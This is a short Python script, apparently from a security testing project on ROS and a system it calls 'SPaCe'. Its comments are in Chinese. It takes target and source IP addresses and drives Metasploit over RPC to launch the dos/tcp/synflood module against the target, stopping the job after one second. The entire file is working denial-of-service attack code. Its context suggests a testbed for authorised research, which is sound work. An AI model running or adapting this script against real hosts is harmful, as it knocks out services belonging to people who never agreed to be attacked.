#!/usr/bin/env python3
from ROS.attacks import *
from pymetasploit3.msfrpc import MsfRpcClient
import argparse
import socket
from datetime import datetime as dt
from datetime import timedelta
from subprocess import run
from shlex import split
from time import sleep
import signal

#parser 輸入參數設定
parser = argparse.ArgumentParser(
    description="Launches attacks on SPaCe. " "May need root privileges to run"
)
## 攻擊目標
parser.add_argument(
    "-t",
    "--target",         # 短選項 -t 與長選項 --target
    metavar="ADDRESS",  # 在 --help 中顯示的參數名稱
    type=validate_ip,   # 輸入值會先經過 validate_ip 函式檢查
    help="the IP address of the target of the attacks. "
    "It's required unless -n|--not-execute is passed.",
)
## 攻擊來源
parser.add_argument(
    "-s",
    "--source",
    metavar="ADDRESS",
    type=validate_ip,
    help="the IP address to be used as the source address of "
    "sent packets. It's required unless -n|--not-execute is passed.",
)
args = parser.parse_args()

def syn_flood():
    msfclient = MsfRpcClient("pentest", ssl=False)
    flood = msfclient.modules.use("auxiliary", "dos/tcp/synflood")
    flood["RHOSTS"] = args.target
    global job
    job = flood.execute()
    print("performing SYN flood...", end="")
    sleep(1)
    msfclient.jobs.stop(job["job_id"])
    print("done")

try:
    # 使用 Metasploit 的 syn_flood() 函式，發動 SYN 洪水攻擊。
    # subprocess.run("sudo ~/metasploit-framework/msfrpcd -P pentest -S")
    syn_flood()
except KeyboardInterrupt:
    print("\n[!] 測試已被使用者中斷。")
except Exception as e:
    print(f"\n[-] 發生非預期錯誤: {e}")

